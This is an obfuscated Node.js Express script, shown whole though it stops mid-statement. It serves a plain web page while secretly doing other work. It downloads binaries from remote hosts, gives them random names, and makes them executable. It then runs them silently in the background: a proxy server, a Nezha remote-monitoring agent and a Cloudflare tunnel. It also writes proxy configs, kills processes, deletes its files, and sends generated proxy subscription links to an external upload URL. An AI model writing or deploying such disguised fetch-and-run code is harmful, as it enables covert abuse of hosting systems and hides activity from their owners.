const _0x5cc0f3=_0x5816;(function(_0x4ff54d,_0x79b944){const _0x5268cc={_0x215dbb:0x138,_0x44cab8:0x119,_0x2d9508:0x15d,_0x5bc16a:0x126},_0x9b3463=_0x5816,_0x2d3c45=_0x4ff54d();while(!![]){try{const _0x1b63b0=parseInt(_0x9b3463(_0x5268cc._0x215dbb))/0x1+parseInt(_0x9b3463(0x198))/0x2+parseInt(_0x9b3463(_0x5268cc._0x44cab8))/0x3*(parseInt(_0x9b3463(0x191))/0x4)+-parseInt(_0x9b3463(0x136))/0x5*(-parseInt(_0x9b3463(_0x5268cc._0x2d9508))/0x6)+parseInt(_0x9b3463(0x14d))/0x7+-parseInt(_0x9b3463(_0x5268cc._0x5bc16a))/0x8*(parseInt(_0x9b3463(0x16c))/0x9)+-parseInt(_0x9b3463(0x11d))/0xa;if(_0x1b63b0===_0x79b944)break;else _0x2d3c45['push'](_0x2d3c45['shift']());}catch(_0x4ab9fe){_0x2d3c45['push'](_0x2d3c45['shift']());}}}(_0x2b4a,0xd277c));const express=require(_0x5cc0f3(0x168)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x5cc0f3(0x16f)),exec=promisify(require('child_process')[_0x5cc0f3(0x1aa)]),{execSync}=require(_0x5cc0f3(0x184)),UPLOAD_URL=process['env'][_0x5cc0f3(0x1a7)]||'',PROJECT_URL=process[_0x5cc0f3(0x131)][_0x5cc0f3(0xfe)]||'',AUTO_ACCESS=process[_0x5cc0f3(0x131)][_0x5cc0f3(0x196)]||![],FILE_PATH=process[_0x5cc0f3(0x131)][_0x5cc0f3(0x110)]||'./tmp',SUB_PATH=process['env'][_0x5cc0f3(0x155)]||_0x5cc0f3(0x118),PORT=process['env'][_0x5cc0f3(0x193)]||process[_0x5cc0f3(0x131)]['PORT']||0xbb8,UUID=process['env'][_0x5cc0f3(0x11f)]||_0x5cc0f3(0x18d),NEZHA_SERVER=process[_0x5cc0f3(0x131)][_0x5cc0f3(0x12c)]||'',NEZHA_PORT=process[_0x5cc0f3(0x131)][_0x5cc0f3(0x152)]||'',NEZHA_KEY=process[_0x5cc0f3(0x131)][_0x5cc0f3(0x181)]||'',ARGO_DOMAIN=process[_0x5cc0f3(0x131)][_0x5cc0f3(0x164)]||'whda2.vsaa.eu.org',ARGO_AUTH=process[_0x5cc0f3(0x131)][_0x5cc0f3(0x15a)]||_0x5cc0f3(0x13e),ARGO_PORT=process[_0x5cc0f3(0x131)][_0x5cc0f3(0x156)]||0x1f41,CFIP=process[_0x5cc0f3(0x131)][_0x5cc0f3(0x177)]||_0x5cc0f3(0x187),CFPORT=process[_0x5cc0f3(0x131)][_0x5cc0f3(0xfb)]||0x1bb,NAME=process['env'][_0x5cc0f3(0x197)]||'whnat';!fs['existsSync'](FILE_PATH)?(fs[_0x5cc0f3(0x120)](FILE_PATH),console[_0x5cc0f3(0x16b)](FILE_PATH+_0x5cc0f3(0x158))):console[_0x5cc0f3(0x16b)](FILE_PATH+_0x5cc0f3(0x10d));function generateRandomName(){const _0x702dde={_0x2d7a79:0x11e},_0x5168b7=_0x5cc0f3,_0x157c86=_0x5168b7(0x194);let _0x557f67='';for(let _0x269fab=0x0;_0x269fab<0x6;_0x269fab++){_0x557f67+=_0x157c86['charAt'](Math['floor'](Math['random']()*_0x157c86[_0x5168b7(_0x702dde._0x2d7a79)]));}return _0x557f67;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5cc0f3(0x115)](FILE_PATH,npmName),phpPath=path[_0x5cc0f3(0x115)](FILE_PATH,phpName),webPath=path[_0x5cc0f3(0x115)](FILE_PATH,webName),botPath=path[_0x5cc0f3(0x115)](FILE_PATH,botName),subPath=path[_0x5cc0f3(0x115)](FILE_PATH,_0x5cc0f3(0x18b)),listPath=path[_0x5cc0f3(0x115)](FILE_PATH,_0x5cc0f3(0x13c)),bootLogPath=path[_0x5cc0f3(0x115)](FILE_PATH,_0x5cc0f3(0xfd)),configPath=path['join'](FILE_PATH,_0x5cc0f3(0xf5));function deleteNodes(){const _0x9b4888={_0x466f91:0x1a3,_0x295df6:0x17e,_0x2ca071:0x17f,_0x358c31:0x101,_0x92e7a7:0xff},_0x43f8ed=_0x5cc0f3;try{if(!UPLOAD_URL)return;if(!fs[_0x43f8ed(_0x9b4888._0x466f91)](subPath))return;let _0x3ddbb1;try{_0x3ddbb1=fs[_0x43f8ed(0x162)](subPath,'utf-8');}catch{return null;}const _0x27dace=Buffer[_0x43f8ed(0x10b)](_0x3ddbb1,_0x43f8ed(0x133))[_0x43f8ed(_0x9b4888._0x295df6)](_0x43f8ed(0x18a)),_0x5bfbce=_0x27dace['split']('\x0a')['filter'](_0x4ed8ef=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4ed8ef));if(_0x5bfbce[_0x43f8ed(0x11e)]===0x0)return;return axios[_0x43f8ed(0x116)](UPLOAD_URL+_0x43f8ed(_0x9b4888._0x2ca071),JSON[_0x43f8ed(0x169)]({'nodes':_0x5bfbce}),{'headers':{'Content-Type':_0x43f8ed(_0x9b4888._0x358c31)}})[_0x43f8ed(_0x9b4888._0x92e7a7)](_0x2d2a5d=>{return null;}),null;}catch(_0xe19d90){return null;}}function cleanupOldFiles(){const _0x3ecb65={_0x21583b:0x112},_0xbfb8e={_0x1026f7:0x115,_0x2b5284:0x190,_0xea56f0:0x195},_0x27a71a=_0x5cc0f3;try{const _0x391804=fs[_0x27a71a(0x1a8)](FILE_PATH);_0x391804[_0x27a71a(_0x3ecb65._0x21583b)](_0xf262c1=>{const _0x786485=_0x27a71a,_0x493213=path[_0x786485(_0xbfb8e._0x1026f7)](FILE_PATH,_0xf262c1);try{const _0x52882a=fs['statSync'](_0x493213);_0x52882a[_0x786485(_0xbfb8e._0x2b5284)]()&&fs[_0x786485(_0xbfb8e._0xea56f0)](_0x493213);}catch(_0xcdb0ab){}});}catch(_0x5bd395){}}app[_0x5cc0f3(0xf7)]('/',function(_0x54a1eb,_0x3ec3ff){const _0x867846={_0x4aaa55:0x180},_0x190c76=_0x5cc0f3;_0x3ec3ff[_0x190c76(0x128)](_0x190c76(_0x867846._0x4aaa55));});async function generateConfig(){const _0x2465bc={_0x596ca8:0xee,_0x2c6818:0xf2,_0x569f61:0x15e,_0x144716:0x1a4,_0x31b705:0xef,_0x5f54db:0x17c,_0x129b80:0x114,_0x670e0d:0x15e,_0x11b531:0x109,_0x3aa974:0x122,_0x46acb2:0xfc,_0x35e726:0xf5},_0x747106=_0x5cc0f3,_0x10479a={'log':{'access':_0x747106(_0x2465bc._0x596ca8),'error':_0x747106(0xee),'loglevel':_0x747106(0x1a4)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x747106(0xef),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x747106(0x1a4),'fallbacks':[{'dest':0xbb9},{'path':_0x747106(0x14f),'dest':0xbba},{'path':_0x747106(0x166),'dest':0xbbb},{'path':_0x747106(0x176),'dest':0xbbc}]},'streamSettings':{'network':_0x747106(_0x2465bc._0x2c6818)}},{'port':0xbb9,'listen':_0x747106(_0x2465bc._0x569f61),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x747106(_0x2465bc._0x144716)},'streamSettings':{'network':_0x747106(_0x2465bc._0x2c6818),'security':_0x747106(0x1a4)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x747106(_0x2465bc._0x31b705),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x747106(0x1a4)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x747106(0x109),_0x747106(_0x2465bc._0x5f54db)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x747106(_0x2465bc._0x129b80),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x747106(0x174),_0x747106(0x109),_0x747106(_0x2465bc._0x5f54db)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x747106(_0x2465bc._0x670e0d),'protocol':_0x747106(0x165),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x747106(0x1a4),'wsSettings':{'path':_0x747106(0x176)}},'sniffing':{'enabled':!![],'destOverride':[_0x747106(0x174),_0x747106(_0x2465bc._0x11b531),_0x747106(_0x2465bc._0x5f54db)],'metadataOnly':![]}}],'dns':{'servers':[_0x747106(0x13b)]},'outbounds':[{'protocol':_0x747106(_0x2465bc._0x3aa974),'tag':_0x747106(_0x2465bc._0x46acb2)},{'protocol':_0x747106(0x19f),'tag':_0x747106(0x10c)}]};fs[_0x747106(0x10f)](path['join'](FILE_PATH,_0x747106(_0x2465bc._0x35e726)),JSON[_0x747106(0x169)](_0x10479a,null,0x2));}function getSystemArchitecture(){const _0x16759c={_0x5a30a4:0x179},_0xcd20bb=_0x5cc0f3,_0x4be88e=os['arch']();return _0x4be88e===_0xcd20bb(_0x16759c._0x5a30a4)||_0x4be88e==='arm64'||_0x4be88e==='aarch64'?_0xcd20bb(_0x16759c._0x5a30a4):'amd';}function _0x5816(_0x254be4,_0x30c401){const _0x2b4a4b=_0x2b4a();return _0x5816=function(_0x58168d,_0x198d4a){_0x58168d=_0x58168d-0xed;let _0x271f89=_0x2b4a4b[_0x58168d];return _0x271f89;},_0x5816(_0x254be4,_0x30c401);}function downloadFile(_0x2bfee1,_0x122656,_0x22b266){const _0x169d38={_0x50f5a4:0x1a3,_0x1e5410:0x143,_0x233360:0x14a},_0x2d159f={_0x5a67e7:0xf4,_0x4cb76e:0x157,_0x3c9c27:0xf1,_0x427708:0x134},_0x5e14e7={_0x21d988:0x12e,_0x48ec75:0x121,_0x5daa3c:0x134},_0x248eec={_0x512800:0x157},_0x30e634=_0x5cc0f3,_0x568f48=_0x2bfee1;!fs[_0x30e634(_0x169d38._0x50f5a4)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x3310e0=fs[_0x30e634(0x103)](_0x568f48);axios({'method':'get','url':_0x122656,'responseType':_0x30e634(_0x169d38._0x1e5410)})[_0x30e634(_0x169d38._0x233360)](_0x230786=>{const _0x13cc8e={_0x2298c0:0x16b,_0x163693:0x18f},_0x471628=_0x30e634;_0x230786[_0x471628(_0x5e14e7._0x21d988)]['pipe'](_0x3310e0),_0x3310e0['on'](_0x471628(_0x5e14e7._0x48ec75),()=>{const _0x5efc3d=_0x471628;_0x3310e0[_0x5efc3d(0x170)](),console[_0x5efc3d(_0x13cc8e._0x2298c0)](_0x5efc3d(_0x13cc8e._0x163693)+path[_0x5efc3d(0xf4)](_0x568f48)+_0x5efc3d(0x105)),_0x22b266(null,_0x568f48);}),_0x3310e0['on'](_0x471628(_0x5e14e7._0x5daa3c),_0x3e502e=>{const _0x35f70f=_0x471628;fs[_0x35f70f(0xf6)](_0x568f48,()=>{});const _0xe7e1b2=_0x35f70f(0x18f)+path[_0x35f70f(0xf4)](_0x568f48)+_0x35f70f(_0x248eec._0x512800)+_0x3e502e['message'];console[_0x35f70f(0x134)](_0xe7e1b2),_0x22b266(_0xe7e1b2);});})[_0x30e634(0xff)](_0x171494=>{const _0x5f4f77=_0x30e634,_0x37a703=_0x5f4f77(0x18f)+path[_0x5f4f77(_0x2d159f._0x5a67e7)](_0x568f48)+_0x5f4f77(_0x2d159f._0x4cb76e)+_0x171494[_0x5f4f77(_0x2d159f._0x3c9c27)];console[_0x5f4f77(_0x2d159f._0x427708)](_0x37a703),_0x22b266(_0x37a703);});}async function downloadFilesAndRun(){const _0x5e2b5e={_0x18fa98:0x16b,_0x341f0c:0x13f,_0x4372ca:0x12d,_0x6165f1:0x134,_0xa5b086:0x151,_0x3e4607:0x178,_0x1a31f2:0x153,_0x2d5290:0x14b,_0x1f8498:0x150,_0x203dec:0x13d,_0x271600:0x115,_0x18d1a9:0x123,_0x2a88a2:0x17d,_0x3409ea:0x140,_0x1f0afd:0x159,_0x568a53:0x17d,_0x566913:0x11a,_0xa3dafb:0x15b,_0x25097f:0x16b,_0x7cb55a:0x134,_0xca3a83:0x1a3,_0x59352a:0x124,_0x5df369:0x19e,_0x32b256:0x17d,_0x10240b:0xf3},_0xb6b612={_0x420c1b:0x112},_0x55b03a=_0x5cc0f3,_0x50b5ee=getSystemArchitecture(),_0x3b3bfe=getFilesForArchitecture(_0x50b5ee);if(_0x3b3bfe[_0x55b03a(0x11e)]===0x0){console[_0x55b03a(_0x5e2b5e._0x18fa98)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x47b91f=_0x3b3bfe[_0x55b03a(_0x5e2b5e._0x341f0c)](_0x441ae0=>{const _0x5634c3={_0x547f15:0x18e};return new Promise((_0x1ef103,_0x1c9543)=>{const _0x16385b=_0x5816;downloadFile(_0x441ae0[_0x16385b(_0x5634c3._0x547f15)],_0x441ae0[_0x16385b(0x142)],(_0x2354b8,_0x2e23ea)=>{_0x2354b8?_0x1c9543(_0x2354b8):_0x1ef103(_0x2e23ea);});});});try{await Promise[_0x55b03a(_0x5e2b5e._0x4372ca)](_0x47b91f);}catch(_0x40d1d5){console[_0x55b03a(_0x5e2b5e._0x6165f1)]('Error\x20downloading\x20files:',_0x40d1d5);return;}function _0x1e8a39(_0x514d67){const _0x408024=_0x55b03a,_0x102ef6=0x1fd;_0x514d67[_0x408024(_0xb6b612._0x420c1b)](_0x188005=>{const _0x3e7367={_0x1ef4f1:0x16b,_0x8796e3:0x148},_0x4f876c=_0x408024;fs[_0x4f876c(0x1a3)](_0x188005)&&fs['chmod'](_0x188005,_0x102ef6,_0x69c57a=>{const _0x3e98c8=_0x4f876c;_0x69c57a?console[_0x3e98c8(0x134)]('Empowerment\x20failed\x20for\x20'+_0x188005+':\x20'+_0x69c57a):console[_0x3e98c8(_0x3e7367._0x1ef4f1)](_0x3e98c8(_0x3e7367._0x8796e3)+_0x188005+':\x20'+_0x102ef6['toString'](0x8));});});}const _0x5e3ce8=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1e8a39(_0x5e3ce8);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xd75d71=NEZHA_SERVER[_0x55b03a(0x140)](':')?NEZHA_SERVER[_0x55b03a(_0x5e2b5e._0xa5b086)](':')[_0x55b03a(0x107)]():'',_0x502865=new Set(['443',_0x55b03a(_0x5e2b5e._0x3e4607),_0x55b03a(0x147),_0x55b03a(_0x5e2b5e._0x1a31f2),'2083',_0x55b03a(_0x5e2b5e._0x2d5290)]),_0x15e008=_0x502865['has'](_0xd75d71)?_0x55b03a(_0x5e2b5e._0x1f8498):_0x55b03a(_0x5e2b5e._0x203dec),_0x5bb001=_0x55b03a(0x15c)+NEZHA_KEY+_0x55b03a(0x139)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x15e008+_0x55b03a(0x146)+UUID;fs['writeFileSync'](path[_0x55b03a(_0x5e2b5e._0x271600)](FILE_PATH,_0x55b03a(_0x5e2b5e._0x18d1a9)),_0x5bb001);const _0x2b3d18=_0x55b03a(_0x5e2b5e._0x2a88a2)+phpPath+_0x55b03a(0x175)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2b3d18),console[_0x55b03a(_0x5e2b5e._0x18fa98)](phpName+_0x55b03a(0x14c)),await new Promise(_0x1a5aee=>setTimeout(_0x1a5aee,0x3e8));}catch(_0x2141f3){console['error']('php\x20running\x20error:\x20'+_0x2141f3);}}else{let _0x5e96d6='';const _0x48e74a=['443','8443',_0x55b03a(0x147),_0x55b03a(0x153),'2083',_0x55b03a(0x14b)];_0x48e74a[_0x55b03a(_0x5e2b5e._0x3409ea)](NEZHA_PORT)&&(_0x5e96d6=_0x55b03a(_0x5e2b5e._0x1f0afd));const _0x4a6100=_0x55b03a(_0x5e2b5e._0x568a53)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x55b03a(0x10a)+NEZHA_KEY+'\x20'+_0x5e96d6+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4a6100),console[_0x55b03a(0x16b)](npmName+_0x55b03a(0x14c)),await new Promise(_0xe33dfa=>setTimeout(_0xe33dfa,0x3e8));}catch(_0x19f8de){console['error'](_0x55b03a(_0x5e2b5e._0x566913)+_0x19f8de);}}}else console['log'](_0x55b03a(0x11b));const _0x1697ab=_0x55b03a(_0x5e2b5e._0x2a88a2)+webPath+_0x55b03a(_0x5e2b5e._0xa3dafb)+FILE_PATH+_0x55b03a(0x135);try{await exec(_0x1697ab),console[_0x55b03a(_0x5e2b5e._0x25097f)](webName+_0x55b03a(0x14c)),await new Promise(_0x3f3100=>setTimeout(_0x3f3100,0x3e8));}catch(_0x4b7505){console[_0x55b03a(_0x5e2b5e._0x7cb55a)]('web\x20running\x20error:\x20'+_0x4b7505);}if(fs[_0x55b03a(_0x5e2b5e._0xca3a83)](botPath)){let _0x5b1020;if(ARGO_AUTH[_0x55b03a(0x1a1)](/^[A-Z0-9a-z=]{120,250}$/))_0x5b1020=_0x55b03a(0xfa)+ARGO_AUTH;else ARGO_AUTH[_0x55b03a(0x1a1)](/TunnelSecret/)?_0x5b1020=_0x55b03a(0x160)+FILE_PATH+_0x55b03a(_0x5e2b5e._0x59352a):_0x5b1020='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x55b03a(_0x5e2b5e._0x5df369)+ARGO_PORT;try{await exec(_0x55b03a(_0x5e2b5e._0x32b256)+botPath+'\x20'+_0x5b1020+_0x55b03a(0x117)),console[_0x55b03a(0x16b)](botName+_0x55b03a(0x14c)),await new Promise(_0x1dea9b=>setTimeout(_0x1dea9b,0x7d0));}catch(_0x424726){console['error'](_0x55b03a(_0x5e2b5e._0x10240b)+_0x424726);}}await new Promise(_0x135070=>setTimeout(_0x135070,0x1388));}function getFilesForArchitecture(_0x28feaf){const _0x28c1a8={_0x101891:0x12a,_0x5b4a55:0x19a,_0x4ac8fa:0x125,_0x3f5104:0x199,_0x58ebfb:0x10e,_0x35628a:0x179,_0x515bac:0x16e},_0x321b4b=_0x5cc0f3;let _0x2c6660;_0x28feaf===_0x321b4b(0x179)?_0x2c6660=[{'fileName':webPath,'fileUrl':_0x321b4b(_0x28c1a8._0x101891)},{'fileName':botPath,'fileUrl':_0x321b4b(_0x28c1a8._0x5b4a55)}]:_0x2c6660=[{'fileName':webPath,'fileUrl':_0x321b4b(_0x28c1a8._0x4ac8fa)},{'fileName':botPath,'fileUrl':_0x321b4b(_0x28c1a8._0x3f5104)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1823e8=_0x28feaf==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x321b4b(_0x28c1a8._0x58ebfb);_0x2c6660['unshift']({'fileName':npmPath,'fileUrl':_0x1823e8});}else{const _0x20f42c=_0x28feaf===_0x321b4b(_0x28c1a8._0x35628a)?_0x321b4b(0xed):_0x321b4b(0x11c);_0x2c6660[_0x321b4b(_0x28c1a8._0x515bac)]({'fileName':phpPath,'fileUrl':_0x20f42c});}}return _0x2c6660;}function argoType(){const _0x332901={_0x386169:0x102,_0x5b3017:0x115,_0x79ac25:0x115},_0x1c3c2c=_0x5cc0f3;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1c3c2c(0x16b)](_0x1c3c2c(_0x332901._0x386169));return;}if(ARGO_AUTH['includes'](_0x1c3c2c(0x137))){fs[_0x1c3c2c(0x10f)](path[_0x1c3c2c(_0x332901._0x5b3017)](FILE_PATH,_0x1c3c2c(0xf9)),ARGO_AUTH);const _0x3792e3='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x1c3c2c(0x151)]('\x22')[0xb]+_0x1c3c2c(0x108)+path[_0x1c3c2c(_0x332901._0x79ac25)](FILE_PATH,'tunnel.json')+_0x1c3c2c(0x167)+ARGO_DOMAIN+_0x1c3c2c(0x106)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x1c3c2c(0x10f)](path[_0x1c3c2c(_0x332901._0x5b3017)](FILE_PATH,_0x1c3c2c(0x171)),_0x3792e3);}else console[_0x1c3c2c(0x16b)](_0x1c3c2c(0x172));}async function extractDomains(){const _0x592ebd={_0x291051:0x162,_0x402e63:0x115,_0x5f0eb6:0x18a,_0x280631:0x112,_0x3e1334:0x11e,_0x4fd08c:0x115,_0x580d2f:0x19d,_0x2387c8:0x19e,_0x1eee4d:0x17d,_0x2467d0:0x117,_0x5f2380:0xf3,_0x3f4c58:0x134},_0x3dff5c={_0x1dabcb:0x14e,_0x4ec2e7:0x145,_0x3c56cc:0x12e,_0x445c83:0x183,_0x4efeee:0x145,_0xb607d9:0x12e,_0x324615:0x1a6,_0x509dad:0x183},_0x4ebbdd={_0x2a0af0:0x192,_0x5f1c45:0x185},_0x17fd49=_0x5cc0f3;let _0x2c8273;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2c8273=ARGO_DOMAIN,console['log'](_0x17fd49(0x144),_0x2c8273),await _0x231478(_0x2c8273);else try{const _0x3a4046=fs[_0x17fd49(_0x592ebd._0x291051)](path[_0x17fd49(_0x592ebd._0x402e63)](FILE_PATH,'boot.log'),_0x17fd49(_0x592ebd._0x5f0eb6)),_0x98eb5e=_0x3a4046['split']('\x0a'),_0x33db7f=[];_0x98eb5e[_0x17fd49(_0x592ebd._0x280631)](_0x38a1ee=>{const _0x181ae9=_0x17fd49,_0x3ade2c=_0x38a1ee[_0x181ae9(0x1a1)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3ade2c){const _0x4acd19=_0x3ade2c[0x1];_0x33db7f[_0x181ae9(0x132)](_0x4acd19);}});if(_0x33db7f[_0x17fd49(_0x592ebd._0x3e1334)]>0x0)_0x2c8273=_0x33db7f[0x0],console['log'](_0x17fd49(0x129),_0x2c8273),await _0x231478(_0x2c8273);else{console[_0x17fd49(0x16b)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x17fd49(0x195)](path[_0x17fd49(_0x592ebd._0x4fd08c)](FILE_PATH,_0x17fd49(0xfd)));async function _0x2e042d(){const _0x465ed2=_0x17fd49;try{process[_0x465ed2(_0x4ebbdd._0x2a0af0)]===_0x465ed2(0x149)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x465ed2(0x17a)+botName[_0x465ed2(0x130)](0x0)+']'+botName[_0x465ed2(0x16a)](0x1)+_0x465ed2(_0x4ebbdd._0x5f1c45));}catch(_0x46a0d0){}}_0x2e042d(),await new Promise(_0x2ab5aa=>setTimeout(_0x2ab5aa,0xbb8));const _0x532e4b=_0x17fd49(_0x592ebd._0x580d2f)+FILE_PATH+_0x17fd49(_0x592ebd._0x2387c8)+ARGO_PORT;try{await exec(_0x17fd49(_0x592ebd._0x1eee4d)+botPath+'\x20'+_0x532e4b+_0x17fd49(_0x592ebd._0x2467d0)),console[_0x17fd49(0x16b)](botName+_0x17fd49(0x14c)),await new Promise(_0x37b183=>setTimeout(_0x37b183,0xbb8)),await extractDomains();}catch(_0x47cc29){console[_0x17fd49(0x134)](_0x17fd49(_0x592ebd._0x5f2380)+_0x47cc29);}}}catch(_0x252758){console[_0x17fd49(_0x592ebd._0x3f4c58)]('Error\x20reading\x20boot.log:',_0x252758);}async function _0x21a868(){const _0x3641c5=_0x17fd49;try{const _0x5d2d88=await axios[_0x3641c5(0xf7)](_0x3641c5(_0x3dff5c._0x1dabcb),{'timeout':0xbb8});if(_0x5d2d88[_0x3641c5(0x12e)]&&_0x5d2d88[_0x3641c5(0x12e)][_0x3641c5(_0x3dff5c._0x4ec2e7)]&&_0x5d2d88[_0x3641c5(_0x3dff5c._0x3c56cc)][_0x3641c5(_0x3dff5c._0x445c83)])return _0x5d2d88[_0x3641c5(_0x3dff5c._0x3c56cc)][_0x3641c5(_0x3dff5c._0x4efeee)]+'_'+_0x5d2d88['data']['org'];}catch(_0x1c5087){try{const _0x3f15fb=await axios[_0x3641c5(0xf7)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x3f15fb[_0x3641c5(0x12e)]&&_0x3f15fb[_0x3641c5(_0x3dff5c._0xb607d9)][_0x3641c5(0x173)]==='success'&&_0x3f15fb['data'][_0x3641c5(_0x3dff5c._0x324615)]&&_0x3f15fb[_0x3641c5(0x12e)][_0x3641c5(_0x3dff5c._0x445c83)])return _0x3f15fb[_0x3641c5(_0x3dff5c._0xb607d9)][_0x3641c5(_0x3dff5c._0x324615)]+'_'+_0x3f15fb[_0x3641c5(0x12e)][_0x3641c5(_0x3dff5c._0x509dad)];}catch(_0x37b741){}}return _0x3641c5(0x18c);}async function _0x231478(_0x1b4918){const _0x59e215={_0x52d3ec:0x1a4,_0x20f566:0x109,_0x564a26:0x169,_0x3c71d9:0x104,_0x200f87:0x17e,_0x10d257:0x133,_0x5e1446:0x10f,_0x5ae121:0x17e,_0x4d8b1c:0x133,_0x12675a:0x16b},_0x49c0ad=await _0x21a868(),_0x4e83ef=NAME?NAME+'-'+_0x49c0ad:_0x49c0ad;return new Promise(_0x1f114f=>{setTimeout(()=>{const _0x199426={_0x44628c:0x10b,_0x352ef2:0x154,_0x6cd256:0x128},_0x7a7395=_0x5816,_0x4c2ee4={'v':'2','ps':''+_0x4e83ef,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x7a7395(_0x59e215._0x52d3ec),'net':'ws','type':_0x7a7395(0x1a4),'host':_0x1b4918,'path':_0x7a7395(0x1a2),'tls':_0x7a7395(_0x59e215._0x20f566),'sni':_0x1b4918,'alpn':'','fp':_0x7a7395(0xf0)},_0x37a76e=_0x7a7395(0x186)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x1b4918+_0x7a7395(0x15f)+_0x1b4918+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x4e83ef+'\x0a\x0avmess://'+Buffer[_0x7a7395(0x10b)](JSON[_0x7a7395(_0x59e215._0x564a26)](_0x4c2ee4))[_0x7a7395(0x17e)]('base64')+_0x7a7395(0x1a0)+UUID+'@'+CFIP+':'+CFPORT+_0x7a7395(_0x59e215._0x3c71d9)+_0x1b4918+'&fp=firefox&type=ws&host='+_0x1b4918+_0x7a7395(0x19b)+_0x4e83ef+'\x0a\x20\x20\x20\x20';console['log'](Buffer[_0x7a7395(0x10b)](_0x37a76e)[_0x7a7395(_0x59e215._0x200f87)](_0x7a7395(_0x59e215._0x10d257))),fs[_0x7a7395(_0x59e215._0x5e1446)](subPath,Buffer['from'](_0x37a76e)[_0x7a7395(_0x59e215._0x5ae121)](_0x7a7395(_0x59e215._0x4d8b1c))),console[_0x7a7395(_0x59e215._0x12675a)](FILE_PATH+_0x7a7395(0x16d)),uploadNodes(),app['get']('/'+SUB_PATH,(_0xa5462f,_0x576525)=>{const _0x42f72f=_0x7a7395,_0x3655a9=Buffer[_0x42f72f(_0x199426._0x44628c)](_0x37a76e)[_0x42f72f(0x17e)](_0x42f72f(0x133));_0x576525['set'](_0x42f72f(0x12f),_0x42f72f(_0x199426._0x352ef2)),_0x576525[_0x42f72f(_0x199426._0x6cd256)](_0x3655a9);}),_0x1f114f(_0x37a76e);},0x7d0);});}}async function uploadNodes(){const _0x169ffb={_0x1742f8:0x101,_0x59c97a:0x16b,_0x1b412b:0x163,_0x1c2293:0x141,_0x5d5fd2:0x162,_0x31b867:0x151,_0x453015:0x116,_0x2a2598:0x101},_0x37ec18=_0x5cc0f3;if(UPLOAD_URL&&PROJECT_URL){const _0x3f93e5=PROJECT_URL+'/'+SUB_PATH,_0x58a439={'subscription':[_0x3f93e5]};try{const _0x576b32=await axios[_0x37ec18(0x116)](UPLOAD_URL+'/api/add-subscriptions',_0x58a439,{'headers':{'Content-Type':_0x37ec18(_0x169ffb._0x1742f8)}});return _0x576b32&&_0x576b32[_0x37ec18(0x173)]===0xc8?(console[_0x37ec18(_0x169ffb._0x59c97a)](_0x37ec18(_0x169ffb._0x1b412b)),_0x576b32):null;}catch(_0x4c3fe0){if(_0x4c3fe0[_0x37ec18(0x141)]){if(_0x4c3fe0[_0x37ec18(_0x169ffb._0x1c2293)][_0x37ec18(0x173)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x37ec18(0x1a3)](listPath))return;const _0x26f318=fs[_0x37ec18(_0x169ffb._0x5d5fd2)](listPath,'utf-8'),_0x3dd39a=_0x26f318[_0x37ec18(_0x169ffb._0x31b867)]('\x0a')[_0x37ec18(0xf8)](_0x5ac4e1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x37ec18(0x19c)](_0x5ac4e1));if(_0x3dd39a[_0x37ec18(0x11e)]===0x0)return;const _0x296c14=JSON['stringify']({'nodes':_0x3dd39a});try{const _0x49bd84=await axios[_0x37ec18(_0x169ffb._0x453015)](UPLOAD_URL+_0x37ec18(0x12b),_0x296c14,{'headers':{'Content-Type':_0x37ec18(_0x169ffb._0x2a2598)}});return 